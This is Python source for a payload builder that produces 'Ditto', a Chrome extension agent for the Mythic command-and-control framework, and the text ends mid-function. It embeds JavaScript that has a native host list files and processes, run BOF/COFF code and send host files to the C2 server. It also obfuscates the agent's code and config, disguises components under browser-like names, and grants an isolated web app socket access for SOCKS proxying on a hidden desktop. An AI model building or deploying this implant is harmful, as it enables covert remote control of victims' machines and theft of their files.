from datetime import datetime
from pathlib import Path
import asyncio
import ast
import base64
import hashlib
import json
import os
import re
import secrets
import shutil
import subprocess
import tempfile
import time
import queue
import threading
import zipfile

from mythic_container.PayloadBuilder import *
from mythic_container.MythicRPC import *

try:
    from .native_host_hardening import find_optional_tool, harden_native_host
except ImportError:
    from native_host_hardening import find_optional_tool, harden_native_host


DEFAULT_EXTENSION_NAME = "Ditto"
DEFAULT_EXTENSION_DESCRIPTION = "Browser-based Mythic C2 proof of concept."
DEFAULT_IWA_APP_ID = "jkplinodenjddmmapdbmldfhamjbmlhm"
DEFAULT_IWA_WEB_BUNDLE_ID = "aovoftwbrfpbsfhx5ubkffwe3eut5dwyit5xd22lv6dibixower3qaacai"
DEFAULT_IWA_ORIGIN = f"isolated-app://{DEFAULT_IWA_WEB_BUNDLE_ID}/"
DEFAULT_IWA_FOLDER_NAME = "vyuaaiyfc4ofxkfe"
DEFAULT_IWA_CONTROL_HOST = "127.0.0.1"
DEFAULT_IWA_CONTROL_PORT = 38899
DEFAULT_IWA_SOCKS_HOST = "127.0.0.1"
DEFAULT_IWA_SOCKS_PORT = 38900
DEFAULT_IWA_DEBUG_NAME = "Ditto IWA"
DEFAULT_IWA_NORMAL_NAME = "Google Chrome"
IWA_KEY_DISTRIBUTION_COMPONENT_ID = "iebhnlpddlcpcfpfalldikcoeakpeoah"
IWA_DIRECT_SOCKETS_ENTITLEMENT = 2
IWA_DIRECT_SOCKETS_PRIVATE_ENTITLEMENT = 4
DEFAULT_NATIVE_HOST_NAME = "com.browser.support"
DEFAULT_NATIVE_HOST_EXE_NAME = "BrowserSupportHost.exe"
DEFAULT_NATIVE_HOST_COMPANY = "Browser Components"
DEFAULT_NATIVE_HOST_PRODUCT = "Browser Support Host"
DEFAULT_NATIVE_HOST_DESCRIPTION = "Browser Support Host"
DEFAULT_NATIVE_HOST_SIGNER = "Browser Support Host"
DEFAULT_NATIVE_HOST_TARGET = "x86_64-pc-windows-msvc"
STEP_GATHERING = "Gathering Files"
STEP_CONFIGURING = "Configuring"
STEP_OBFUSCATING = "Obfuscating"
STEP_NATIVE_HOST = "Building Native Host"
STEP_NATIVE_HOST_PREPARE = "Native Host: Preparing"
STEP_NATIVE_HOST_COMPILE = "Native Host: Compiling"
STEP_NATIVE_HOST_HARDEN = "Native Host: Hardening"
STEP_NATIVE_HOST_SIGN = "Native Host: Signing"
STEP_IWA = "Building IWA"
STEP_IWA_PREPARE = "IWA: Preparing"
STEP_IWA_DEPS = "IWA: Dependencies"
STEP_IWA_BUNDLE = "IWA: Web Bundle"
STEP_IWA_METADATA = "IWA: Install Metadata"
STEP_PACKAGING = "Packaging"

NATIVE_HOST_COMMAND_FEATURES = {
    "ls": "cmd_ls",
    "ps": "cmd_ps",
    "upload": "cmd_upload",
    "download": "cmd_download",
    "coffexec": "cmd_coffexec",
    "launch_iwa_hidden_desktop": "cmd_iwa",
}

NATIVE_HOST_COMMANDS = tuple(NATIVE_HOST_COMMAND_FEATURES.keys())
NATIVE_HOST_REQUIRED_COMMANDS = (*NATIVE_HOST_COMMANDS, "register_coff")

IWA_COMMANDS = (
    "launch_iwa_extension",
    "close_iwa_extension",
    "iwa_status",
    "iwa_ping",
    "iwa_control",
    "iwa_start_socks",
    "iwa_stop_socks",
    "socks",
    "launch_iwa_hidden_desktop",
)

COMMAND_MANIFEST_PERMISSIONS = {
    "dns": ["dns"],
    "dns_lookup": ["dns"],
    **{command: ["nativeMessaging"] for command in NATIVE_HOST_COMMANDS},
}

NATIVE_HOST_RUNTIME_JS = r"""
function nativeHostConfigured() {
  return Boolean(DITTO_CONFIG.n && DITTO_CONFIG.nk && chrome.runtime && chrome.runtime.connectNative);
}

const NATIVE_HOST_PORT = {
  host: "",
  port: null,
  pending: new Map(),
  lastError: ""
};

function nativeBytesToBase64Url(bytes) {
  let binary = "";
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

function nativeBase64ToBytes(value) {
  const normalized = String(value).replace(/-/g, "+").replace(/_/g, "/");
  const padded = normalized + "=".repeat((4 - (normalized.length % 4)) % 4);
  const binary = atob(padded);
  return Uint8Array.from(binary, (c) => c.charCodeAt(0));
}

function nativeBase64ToRawBytes(value) {
  const binary = atob(String(value));
  return Uint8Array.from(binary, (c) => c.charCodeAt(0));
}

async function nativeImportKey() {
  return crypto.subtle.importKey(
    "raw",
    nativeBase64ToRawBytes(DITTO_CONFIG.nk),
    "AES-GCM",
    false,
    ["encrypt", "decrypt"]
  );
}

async function nativeEncrypt(payload) {
  const key = await nativeImportKey();
  const nonce = crypto.getRandomValues(new Uint8Array(12));
  const plaintext = TEXT_ENCODER.encode(JSON.stringify(payload));
  const ciphertext = new Uint8Array(await crypto.subtle.encrypt({ name: "AES-GCM", iv: nonce }, key, plaintext));
  return {
    v: 1,
    k: "a1",
    n: nativeBytesToBase64Url(nonce),
    d: nativeBytesToBase64Url(ciphertext)
  };
}

async function nativeDecrypt(envelope) {
  const key = await nativeImportKey();
  const nonce = nativeBase64ToBytes(envelope.n);
  const ciphertext = nativeBase64ToBytes(envelope.d);
  const plaintext = new Uint8Array(await crypto.subtle.decrypt({ name: "AES-GCM", iv: nonce }, key, ciphertext));
  return JSON.parse(TEXT_DECODER.decode(plaintext));
}

function rejectNativePending(error) {
  for (const pending of NATIVE_HOST_PORT.pending.values()) {
    clearTimeout(pending.timer);
    pending.reject(error);
  }
  NATIVE_HOST_PORT.pending.clear();
}

async function handleNativeMessage(envelope) {
  try {
    const response = await nativeDecrypt(envelope);
    const id = String(response && response.id ? response.id : "");
    const pending = NATIVE_HOST_PORT.pending.get(id);
    if (!pending) {
      return;
    }
    clearTimeout(pending.timer);
    NATIVE_HOST_PORT.pending.delete(id);
    pending.resolve(response);
  } catch (error) {
    rejectNativePending(error instanceof Error ? error : new Error(String(error)));
  }
}

function connectNativeHost(host) {
  if (NATIVE_HOST_PORT.port && NATIVE_HOST_PORT.host === host) {
    return NATIVE_HOST_PORT.port;
  }
  if (NATIVE_HOST_PORT.port) {
    try {
      NATIVE_HOST_PORT.port.disconnect();
    } catch (_) {}
    rejectNativePending(new Error("native host connection changed"));
  }

  const port = chrome.runtime.connectNative(host);
  NATIVE_HOST_PORT.host = host;
  NATIVE_HOST_PORT.port = port;
  NATIVE_HOST_PORT.lastError = "";

  port.onMessage.addListener((envelope) => {
    handleNativeMessage(envelope);
  });
  port.onDisconnect.addListener(() => {
    const message = chrome.runtime.lastError && chrome.runtime.lastError.message
      ? chrome.runtime.lastError.message
      : "native host disconnected";
    if (NATIVE_HOST_PORT.port === port) {
      NATIVE_HOST_PORT.port = null;
      NATIVE_HOST_PORT.lastError = message;
      rejectNativePending(new Error(message));
    }
  });

  return port;
}

function nativeCommandTimeoutMs(params, args) {
  const explicit = Number(params.native_timeout_ms || params.timeout_ms || params.timeoutMs || 0);
  if (Number.isFinite(explicit) && explicit > 0) {
    return explicit;
  }
  const seconds = Number(args && args.timeout ? args.timeout : params.timeout || 0);
  if (Number.isFinite(seconds) && seconds > 0) {
    return Math.max(60000, (seconds + 15) * 1000);
  }
  return 300000;
}

function sendNativeEnvelope(host, requestId, envelope, timeoutMs) {
  return new Promise((resolve, reject) => {
    let port;
    try {
      port = connectNativeHost(host);
    } catch (error) {
      reject(error instanceof Error ? error : new Error(String(error)));
      return;
    }
    const id = String(requestId);
    const timer = setTimeout(() => {
      NATIVE_HOST_PORT.pending.delete(id);
      reject(new Error("native host command timed out"));
    }, Math.max(1000, Number(timeoutMs) || 300000));
    NATIVE_HOST_PORT.pending.set(id, {
      resolve,
      reject,
      timer
    });
    try {
      port.postMessage(envelope);
    } catch (error) {
      clearTimeout(timer);
      NATIVE_HOST_PORT.pending.delete(id);
      reject(error instanceof Error ? error : new Error(String(error)));
    }
  });
}

async function executeNativeHostCommand(params = {}) {
  if (!nativeHostConfigured()) {
    throw new Error("native host is not configured");
  }
  const command = String(params.command || params.c || "ls");
  let args = params.args ?? params.a ?? {};
  if (typeof args === "string" && args.trim().startsWith("{")) {
    args = JSON.parse(args);
  }
  const requestId = crypto.randomUUID();
  const envelope = await nativeEncrypt({
    id: requestId,
    c: command,
    a: args
  });
  const response = await sendNativeEnvelope(
    String(params.host || DITTO_CONFIG.n),
    requestId,
    envelope,
    nativeCommandTimeoutMs(params, args)
  );
  if (response && typeof response === "object" && Object.prototype.hasOwnProperty.call(response, "ok")) {
    if (!response.ok) {
      throw new Error(response.e || "native host command failed");
    }
    return response.r || {};
  }
  return response || {};
}

function coffStorageKey(name) {
  const normalized = String(name || "").trim().toLowerCase();
  if (!normalized) {
    throw new Error("registered COFF name is required");
  }
  return `coff:${normalized}`;
}

async function registerCoff(params = {}) {
  const name = String(params.name || params.coff_name || params.filename || "").trim();
  const coffB64 = String(params.coff_b64 || params.data_b64 || "");
  if (!name) {
    throw new Error("register_coff requires name");
  }
  if (!coffB64) {
    throw new Error("register_coff requires coff_b64");
  }
  const record = {
    name,
    filename: String(params.filename || name),
    fileId: params.file_id || params.agent_file_id || "",
    size: Number(params.size || 0),
    registeredAt: new Date().toISOString(),
    envelope: await nativeEncrypt({
      coff_b64: coffB64
    })
  };
  await chrome.storage.local.set({
    [coffStorageKey(name)]: record
  });
  return {
    registered: true,
    name,
    filename: record.filename,
    fileId: record.fileId,
    size: record.size,
    encrypted: true,
    registeredAt: record.registeredAt
  };
}

async function resolveRegisteredCoffArgs(command, args = {}) {
  if (command !== "coffexec") {
    return args;
  }
  if (args.path || args.coff_path) {
    throw new Error("coffexec path tasking is disabled");
  }
  if (args.coff_b64) {
    const source = String(args.coff_source || args.source || "").toLowerCase();
    if (!["registered", "new"].includes(source)) {
      throw new Error("coffexec inline tasking is disabled; use Registered or New BOF");
    }
    return {
      ...args,
      coff_source: source
    };
  }
  const name = String(args.coff || args.coff_name || args.name || "").trim();
  if (!name) {
    throw new Error("coffexec requires a registered COFF name or New BOF upload");
  }
  const state = await chrome.storage.local.get(coffStorageKey(name));
  const record = state[coffStorageKey(name)];
  if (!record || !record.envelope) {
    throw new Error(`registered COFF not found: ${name}`);
  }
  const decrypted = await nativeDecrypt(record.envelope);
  return {
    ...args,
    coff: record.name || name,
    coff_name: record.name || name,
    coff_source: "registered",
    coff_b64: decrypted.coff_b64
  };
}

function nativeTransferChunkSize(value) {
  const chunkSize = Number(value || 512000);
  if (!Number.isFinite(chunkSize) || chunkSize <= 0) {
    return 512000;
  }
  return Math.max(1, Math.min(512000, Math.trunc(chunkSize)));
}

function nativeFileNameFromPath(path, fallback = "download.bin") {
  const text = String(path || "");
  const parts = text.split(/[\\/]/).filter((part) => part.length > 0);
  return parts.length ? parts[parts.length - 1] : fallback;
}

function unwrapMythicUploadChunkResponse(response) {
  const candidates = [
    response,
    response?.response,
    response?.responses?.[0]?.upload,
    response?.responses?.[0],
    response?.upload
  ];

  for (const candidate of candidates) {
    if (
      candidate &&
      typeof candidate === "object" &&
      (
        Object.prototype.hasOwnProperty.call(candidate, "chunk_data") ||
        Object.prototype.hasOwnProperty.call(candidate, "total_chunks")
      )
    ) {
      return candidate;
    }
  }

  for (const candidate of candidates) {
    if (candidate && typeof candidate === "object" && Object.prototype.hasOwnProperty.call(candidate, "status")) {
      return candidate;
    }
  }

  return {};
}

async function requestMythicFileChunk(taskId, fileId, chunkNum, chunkSize, fullPath) {
  const response = await postMythic({
    action: "post_response",
    responses: [
      {
        task_id: taskId,
        upload: {
          chunk_size: chunkSize,
          file_id: fileId,
          chunk_num: chunkNum,
          full_path: fullPath || ""
        }
      }
    ]
  });

  const chunk = unwrapMythicUploadChunkResponse(response);
  const status = String(chunk.status || "").toLowerCase();
  if (status.includes("error")) {
    throw new Error(chunk.error || "Mythic file chunk request failed");
  }
  if (!Object.prototype.hasOwnProperty.call(chunk, "chunk_data")) {
    throw new Error("Mythic did not return file chunk data");
  }
  return {
    totalChunks: Number(chunk.total_chunks || chunk.totalChunks || 1),
    chunkNum: Number(chunk.chunk_num || chunk.chunkNum || chunkNum),
    data: base64ToBytes(chunk.chunk_data || "")
  };
}

async function uploadFileFromMythicToHost(taskId, params = {}) {
  const fileId = String(params.file || params.file_id || params.agent_file_id || "").trim();
  if (!fileId) {
    throw new Error("upload requires a Mythic file id");
  }
  const fallbackName = String(params.file_name || params.filename || "upload.bin");
  const targetPath = String(params.path || params.remote_path || fallbackName);
  const chunkSize = nativeTransferChunkSize(params.chunk_size || params.chunkSize);
  const createDirs = params.create_dirs !== false;

  let totalChunks = 1;
  let written = 0;
  for (let chunkNum = 1; chunkNum <= totalChunks; chunkNum += 1) {
    const chunk = await requestMythicFileChunk(taskId, fileId, chunkNum, chunkSize, targetPath);
    totalChunks = Math.max(1, Number(chunk.totalChunks || totalChunks));
    const response = await executeNamedNativeHostCommand("upload", {
      path: targetPath,
      data_b64: bytesToBase64(chunk.data),
      append: chunkNum > 1,
      create_dirs: chunkNum === 1 ? createDirs : false
    });
    written += Number(response.written || chunk.data.length || 0);
  }

  return {
    path: targetPath,
    file_id: fileId,
    agent_file_id: fileId,
    filename: fallbackName,
    written,
    chunks: totalChunks
  };
}

async function downloadFileFromHostToMythic(taskId, params = {}) {
  const path = String(params.path || "").trim();
  if (!path) {
    throw new Error("download requires a path");
  }
  const chunkSize = nativeTransferChunkSize(params.chunk_size || params.chunkSize || params.length);
  const first = await executeNamedNativeHostCommand("download", {
    path,
    offset: 0,
    length: chunkSize
  });
  const firstBytes = base64ToBytes(first.data_b64 || "");
  const fileLen = Number(first.file_len || first.read || firstBytes.length || 0);
  const totalChunks = Math.max(1, Math.ceil(fileLen / chunkSize));
  const fileName = nativeFileNameFromPath(path, "download.bin");
  const fileId = await beginMythicFileUpload(taskId, totalChunks, {
    filename: fileName,
    fullPath: path,
    chunkSize
  });

  await sendMythicFileUploadChunk(taskId, fileId, 1, firstBytes, chunkSize);

  let offset = Number(first.offset || 0) + Number(first.read || firstBytes.length || 0);
  for (let chunkNum = 2; chunkNum <= totalChunks; chunkNum += 1) {
    const result = await executeNamedNativeHostCommand("download", {
      path,
      offset,
      length: chunkSize
    });
    const bytes = base64ToBytes(result.data_b64 || "");
    await sendMythicFileUploadChunk(taskId, fileId, chunkNum, bytes, chunkSize);
    offset += Number(result.read || bytes.length || 0);
  }

  return {
    path,
    filename: fileName,
    file_id: fileId,
    agent_file_id: fileId,
    file_len: fileLen,
    chunks: totalChunks,
    chunk_size: chunkSize
  };
}

async function executeNamedNativeHostCommand(command, args = {}) {
  const resolvedArgs = await resolveRegisteredCoffArgs(command, args);
  return executeNativeHostCommand({
    command,
    args: resolvedArgs
  });
}
"""

NATIVE_HOST_CASES_JS = r"""
    case "register_coff": {
      await sendTaskResponse(task.id, await registerCoff(params));
      return;
    }

    case "ls":
    case "ps":
    case "coffexec":
    case "launch_iwa_hidden_desktop": {
      await sendTaskResponse(task.id, await executeNamedNativeHostCommand(command, params));
      return;
    }

    case "upload": {
      await sendTaskResponse(task.id, await uploadFileFromMythicToHost(task.id, params));
      return;
    }

    case "download": {
      await sendTaskResponse(task.id, await downloadFileFromHostToMythic(task.id, params));
      return;
    }
"""

OBFUSCATED_IDENTIFIERS = [
    "DITTO_CONFIG",
    "TEXT_ENCODER",
    "TEXT_DECODER",
    "sanitizeTab",
    "getRandomUnit",
    "getJitteredDelaySeconds",
    "hasAesKey",
    "getCallbackBase",
    "getPostUrl",
    "bytesToBase64",
    "base64ToBytes",
    "concatBytes",
    "importCryptoKey",
    "encryptMythicMessage",
    "decryptWithUuidPrefix",
    "decryptWithoutUuidPrefix",
    "decryptMythicMessage",
    "postMythic",
    "getState",
    "setState",
    "collectIdentity",
    "sendTaskResponse",
    "unwrapFileTransferResponse",
    "dataUrlToBytes",
    "beginMythicFileUpload",
    "sendMythicFileUploadChunk",
    "uploadFileToMythic",
    "nativeTransferChunkSize",
    "nativeFileNameFromPath",
    "unwrapMythicUploadChunkResponse",
    "requestMythicFileChunk",
    "uploadFileFromMythicToHost",
    "downloadFileFromHostToMythic",
    "pause",
    "getTabForCapture",
    "executeTask",
    "checkIn",
    "pollTasking",
    "ensureAlarm",
    "scheduleNextAlarm",
    "pollTaskingAndReschedule",
    "getDohResolverUrl",
    "resolveDnsNative",
    "resolveDnsDoh",
    "resolveDns",
    "nativeHostConfigured",
    "nativeBytesToBase64Url",
    "nativeBase64ToBytes",
    "nativeBase64ToRawBytes",
    "nativeImportKey",
    "nativeEncrypt",
    "nativeDecrypt",
    "NATIVE_HOST_PORT",
    "rejectNativePending",
    "handleNativeMessage",
    "connectNativeHost",
    "nativeCommandTimeoutMs",
    "sendNativeEnvelope",
    "executeNativeHostCommand",
    "coffStorageKey",
    "registerCoff",
    "resolveRegisteredCoffArgs",
    "executeNamedNativeHostCommand",
    "getIwaLaunchState",
    "setIwaLaunchState",
    "clearIwaLaunchState",
    "normalizeIwaBaseUrl",
    "iwaUrlMatches",
    "rememberIwaLaunch",
    "closeIwaExtension",
    "launchIwaWithDebugger",
    "launchIwaWithTab",
    "launchIwaWithWindow",
    "launchIwa",
]

JAVASCRIPT_STRING_PATTERN = re.compile(r'"(?:\\.|[^"\\])*"|\'(?:\\.|[^\'\\])*\'')


def _get_parameter(payload: PayloadType, name: str, default_value=None):
    value = payload.get_parameter(name)
    return default_value if value in [None, ""] else value


def _get_parameter_any(payload: PayloadType, names: list[str], default_value=None):
    for name in names:
        value = payload.get_parameter(name)
        if value not in [None, ""]:
            return value
    return default_value


def _get_bool_parameter(payload: PayloadType, name: str, default_value: bool = False) -> bool:
    value = payload.get_parameter(name)
    if value is None:
        return default_value
    if isinstance(value, bool):
        return value
    return str(value).strip().lower() in {"1", "true", "yes", "on"}


def _get_int_parameter(payload: PayloadType, name: str, default_value: int) -> int:
    value = _get_parameter(payload, name, default_value)
    try:
        return int(value)
    except Exception:
        return default_value


def _minify_javascript(text: str) -> str:
    return " ".join(line.strip() for line in text.splitlines() if line.strip())


def _mangle_javascript_identifiers(text: str) -> str:
    for index, identifier in enumerate(OBFUSCATED_IDENTIFIERS):
        obfuscated_name = f"_0x{index:02x}"
        text = re.sub(rf"\b{re.escape(identifier)}\b", obfuscated_name, text)
    return text


def _encode_javascript_string_literal(literal: str, key: int) -> str:
    raw_bytes = ast.literal_eval(literal).encode("utf-8")
    encoded_bytes = bytes(byte ^ key for byte in raw_bytes)
    return base64.b64encode(encoded_bytes).decode("ascii")


def _obfuscate_javascript_strings(text: str) -> str:
    seed = hashlib.md5(text.encode("utf-8")).hexdigest()
    key = int(seed[:2], 16) or 0x5A
    pool_name = f"_0x{seed[2:8]}"
    decode_name = f"_0x{seed[8:14]}"
    string_pool: list[str] = []

    def replace(match: re.Match[str]) -> str:
        literal = match.group(0)
        next_char = text[match.end():match.end() + 1]
        previous_chars = text[max(0, match.start() - 8):match.start()]

        if next_char == ":" and not previous_chars.rstrip().endswith("case"):
            return literal

        if literal in {"''", "\"\""}:
            return literal

        string_pool.append(_encode_javascript_string_literal(literal, key))
        return f"{decode_name}({len(string_pool) - 1})"

    transformed = JAVASCRIPT_STRING_PATTERN.sub(replace, text)
    if not string_pool:
        return transformed

    decoder = (
        f"const {pool_name}={json.dumps(string_pool)};"
        f"const {decode_name}=(i)=>{{const d=atob({pool_name}[i]);"
        "let o='';"
        f"for(let j=0;j<d.length;j+=1){{o+=String.fromCharCode(d.charCodeAt(j)^{key});}}"
        "return o;};"
    )
    return decoder + transformed


def _obfuscate_javascript(text: str) -> str:
    text = _mangle_javascript_identifiers(text)
    text = _obfuscate_javascript_strings(text)
    return _minify_javascript(text)


def _build_embedded_config_bootstrap(config_values: dict) -> str:
    raw_config = json.dumps(config_values, separators=(",", ":")).encode("utf-8")
    key = secrets.token_bytes(16)
    encoded = bytes(byte ^ key[index % len(key)] for index, byte in enumerate(raw_config))
    encoded_config = base64.b64encode(encoded).decode("ascii")
    key_array = ",".join(str(byte) for byte in key)
    return (
        "const DITTO_CONFIG=Object.freeze(JSON.parse(new TextDecoder().decode("
        f"Uint8Array.from(atob({json.dumps(encoded_config)}),"
        f"(c,i)=>c.charCodeAt(0)^[{key_array}][i%16]))));"
    )


def _write_manifest(
    manifest_path: Path,
    extension_name: str,
    extension_version: str,
    extension_description: str,
    manifest_key: str,
    included_commands: list[str],
    icon_relative_path: str = "",
) -> None:
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["name"] = extension_name
    manifest["version"] = extension_version
    manifest["description"] = extension_description
    manifest["permissions"] = _build_manifest_permissions(
        list(manifest.get("permissions", [])),
        included_commands,
    )

    if manifest_key:
        manifest["key"] = manifest_key
    else:
        manifest.pop("key", None)

    if icon_relative_path:
        icon_map = {
            "16": icon_relative_path,
            "32": icon_relative_path,
            "48": icon_relative_path,
            "128": icon_relative_path,
        }
        manifest["icons"] = icon_map
        manifest["action"] = {
            **manifest.get("action", {}),
            "default_icon": icon_map,
        }
    else:
        manifest.pop("icons", None)
        action = manifest.get("action")
        if isinstance(action, dict):
            action.pop("default_icon", None)
            if not action:
                manifest.pop("action", None)

    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")


def _extract_file_contents(rpc_response) -> bytes | None:
    if rpc_response is None:
        return None

    candidates = []
    if isinstance(rpc_response, dict):
        candidates.extend(
            rpc_response.get(key)
            for key in ("Content", "content", "FileContents", "file_contents")
        )
    else:
        candidates.extend(
            getattr(rpc_response, key, None)
            for key in ("Content", "content", "FileContents", "file_contents")
        )

    for candidate in candidates:
        if candidate is None:
            continue
        if isinstance(candidate, bytes):
            return candidate
        if isinstance(candidate, bytearray):
            return bytes(candidate)
        if isinstance(candidate, str):
            try:
                return base64.b64decode(candidate, validate=True)
            except Exception:
                return candidate.encode("utf-8")
    return None


async def _fetch_uploaded_file(file_uuid: str) -> bytes:
    try:
        request = MythicRPCFileGetContentMessage(AgentFileId=file_uuid)
    except TypeError:
        request = MythicRPCFileGetContentMessage(AgentFileID=file_uuid)

    rpc_response = await SendMythicRPCFileGetContent(
        request
    )

    success = True
    if isinstance(rpc_response, dict):
        success = rpc_response.get("Success", rpc_response.get("success", True))
    else:
        success = getattr(rpc_response, "Success", getattr(rpc_response, "success", True))

    if success is False:
        raise ValueError("Mythic failed to return uploaded file contents")

    file_contents = _extract_file_contents(rpc_response)
    if not file_contents:
        raise ValueError("Uploaded icon file was empty or unreadable")
    return file_contents


def _detect_icon_suffix(file_bytes: bytes) -> str:
    if file_bytes.startswith(b"\x89PNG\r\n\x1a\n"):
        return ".png"
    if file_bytes.startswith(b"\xff\xd8\xff"):
        return ".jpg"
    if file_bytes.startswith((b"GIF87a", b"GIF89a")):
        return ".gif"
    if file_bytes.startswith(b"BM"):
        return ".bmp"
    if file_bytes.startswith(b"\x00\x00\x01\x00"):
        return ".ico"
    raise ValueError("Uploaded icon must be a supported raster image (PNG, JPG, GIF, BMP, or ICO)")


def _write_extension_icon(output_dir: Path, file_bytes: bytes) -> str:
    icons_dir = output_dir / "icons"
    icons_dir.mkdir(parents=True, exist_ok=True)
    suffix = _detect_icon_suffix(file_bytes)
    icon_path = icons_dir / f"extension_icon{suffix}"
    icon_path.write_bytes(file_bytes)
    return str(icon_path.relative_to(output_dir)).replace("\\", "/")


def _sanitize_filename(value: str, fallback: str) -> str:
    sanitized = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", value).strip()
    sanitized = re.sub(r"\s+", " ", sanitized).strip(" .")
    return sanitized or fallback


def _build_archive_filename(preferred_name: str, fallback_name: str) -> str:
    chosen_name = (preferred_name or "").strip() or fallback_name
    sanitized = _sanitize_filename(chosen_name, fallback_name)
    if sanitized.lower().endswith(".zip"):
        return sanitized
    return f"{sanitized}.zip"


def _extension_id_from_manifest_key(manifest_key: str) -> str:
    if not manifest_key:
        return ""

    try:
        raw_key = base64.b64decode("".join(manifest_key.split()), validate=True)
    except Exception:
        return ""

    digest = hashlib.sha256(raw_key).digest()[:16]
    alphabet = "abcdefghijklmnop"
    return "".join(alphabet[byte >> 4] + alphabet[byte & 0x0F] for byte in digest)


def _chrome_app_id_from_iwa_origin(iwa_origin: str) -> str:
    first_hash = hashlib.sha256(iwa_origin.encode("utf-8")).digest()
    second_hash = hashlib.sha256(first_hash).digest()[:16]
    alphabet = "abcdefghijklmnop"
    return "".join(alphabet[byte >> 4] + alphabet[byte & 0x0F] for byte in second_hash)


def _encode_varint(value: int) -> bytes:
    output = bytearray()
    while value > 0x7F:
        output.append((value & 0x7F) | 0x80)
        value >>= 7
    output.append(value)
    return bytes(output)


def _pb_key(field_number: int, wire_type: int) -> bytes:
    return _encode_varint((field_number << 3) | wire_type)


def _pb_bytes_field(field_number: int, value: bytes) -> bytes:
    return _pb_key(field_number, 2) + _encode_varint(len(value)) + value


def _pb_string_field(field_number: int, value: str) -> bytes:
    return _pb_bytes_field(field_number, value.encode("utf-8"))


def _pb_packed_varint_field(field_number: int, values: list[int]) -> bytes:
    packed = b"".join(_encode_varint(value) for value in values)
    return _pb_bytes_field(field_number, packed)


def _iwa_key_distribution_version() -> str:
    now = datetime.utcnow()
    return f"{now.year}.{now.month}.{now.day}.1"


def _build_iwa_key_distribution_pb(web_bundle_id: str, enterprise_name: str) -> bytes:
    version_range = _pb_string_field(1, "0.0.0")
    entitlement_set = (
        _pb_bytes_field(1, version_range)
        + _pb_packed_varint_field(2, [
            IWA_DIRECT_SOCKETS_ENTITLEMENT,
            IWA_DIRECT_SOCKETS_PRIVATE_ENTITLEMENT,
        ])
    )
    allowlist_value = (
        _pb_string_field(1, enterprise_name)
        + _pb_bytes_field(2, entitlement_set)
    )
    map_entry = (
        _pb_string_field(1, web_bundle_id)
        + _pb_bytes_field(2, allowlist_value)
    )
    access_control = _pb_bytes_field(3, map_entry)
    return _pb_bytes_field(3, access_control)


def _decode_varint(data: bytes, offset: int) -> tuple[int, int]:
    shift = 0
    value = 0
    cursor = offset
    while cursor < len(data):
        byte = data[cursor]
        value |= (byte & 0x7F) << shift
        cursor += 1
        if not byte & 0x80:
            return value, cursor
        shift += 7
        if shift > 35:
            break
    raise ValueError("invalid protobuf varint")


def _replace_length_delimited_value(data: bytes, old_value: bytes, new_value: bytes) -> bytes:
    index = data.find(old_value)
    if index < 0:
        raise ValueError("old IWA signature was not found in protobuf template")

    for varint_start in range(max(0, index - 5), index):
        try:
            length, varint_end = _decode_varint(data, varint_start)
        except ValueError:
            continue
        if varint_end == index and length == len(old_value):
            return (
                data[:varint_start]
                + _encode_varint(len(new_value))
                + new_value
                + data[index + len(old_value):]
            )

    raise ValueError("could not locate protobuf length prefix for IWA signature")


def _replace_nested_length_delimited_values(data: bytes, replacements: list[tuple[bytes, bytes]]) -> tuple[bytes, int]:
    if not data:
        return data, 0

    output = bytearray()
    offset = 0
    changed = 0
    data_len = len(data)

    try:
        while offset < data_len:
            key_start = offset
            key, offset = _decode_varint(data, offset)
            wire_type = key & 0x07
            field_number = key >> 3
            if field_number <= 0 or wire_type not in (0, 1, 2, 5):
                raise ValueError("not a protobuf message")
            key_bytes = data[key_start:offset]
            output.extend(key_bytes)

            if wire_type == 0:
                value_start = offset
                _, offset = _decode_varint(data, offset)
                output.extend(data[value_start:offset])
            elif wire_type == 1:
                if offset + 8 > data_len:
                    raise ValueError("truncated fixed64")
                output.extend(data[offset:offset + 8])
                offset += 8
            elif wire_type == 5:
                if offset + 4 > data_len:
                    raise ValueError("truncated fixed32")
                output.extend(data[offset:offset + 4])
                offset += 4
            else:
                length, value_start = _decode_varint(data, offset)
                value_end = value_start + length
                if value_end > data_len:
                    raise ValueError("truncated length-delimited field")
                value = data[value_start:value_end]
                new_value = value
                for old, new in replacements:
                    if value == old:
                        new_value = new
                        changed += 1
                        break
                else:
                    if any(old in value for old, _ in replacements):
                        try:
                            patched_child, child_changed = _replace_nested_length_delimited_values(value, replacements)
                        except ValueError:
                            patched_child, child_changed = value, 0
                        if child_changed:
                            new_value = patched_child
                            changed += child_changed

                output.extend(_encode_varint(len(new_value)))
                output.extend(new_value)
                offset = value_end
    except (IndexError, ValueError):
        if changed:
            raise
        return data, 0

    return bytes(output), changed


def _replace_all_length_delimited_values(data: bytes, old_value: bytes, new_value: bytes) -> tuple[bytes, int]:
    patched, count = _replace_nested_length_delimited_values(data, [(old_value, new_value)])
    if count:
        return patched, count

    count = 0
    patched = data
    while old_value in patched:
        patched = _replace_length_delimited_value(patched, old_value, new_value)
        count += 1
    return patched, count


def _patch_iwa_webapp_record(
    template_path: Path,
    output_path: Path,
    old_signature_hex: str,
    new_signature_hex: str,
    old_web_bundle_id: str,
    new_web_bundle_id: str,
    old_public_key: str,
    new_public_key: str,
    old_app_name: str = "",
    new_app_name: str = "",
) -> None:
    data = template_path.read_bytes()
    old_signature = old_signature_hex.strip().encode("ascii")
    new_signature = new_signature_hex.strip().upper().encode("ascii")

    signature_replacements = [(old_signature, new_signature)]
    if old_signature.lower() != old_signature:
        signature_replacements.append((old_signature.lower(), new_signature))
    patched, signature_replaced = _replace_nested_length_delimited_values(data, signature_replacements)
    if signature_replaced == 0:
        try:
            patched = _replace_length_delimited_value(data, old_signature, new_signature)
        except ValueError:
            patched = _replace_length_delimited_value(data, old_signature.lower(), new_signature)

    replacements = (
        (old_web_bundle_id.strip().encode("ascii"), new_web_bundle_id.strip().encode("ascii")),
        (old_public_key.strip().encode("ascii"), new_public_key.strip().encode("ascii")),
    )
    for old_value, new_value in replacements:
        if len(old_value) != len(new_value):
            raise ValueError("IWA protobuf template replacement changed length")
        if old_value not in patched:
            raise ValueError("IWA protobuf template value was not found")
        patched = patched.replace(old_value, new_value)

    old_app_name = old_app_name.strip()
    new_app_name = new_app_name.strip()
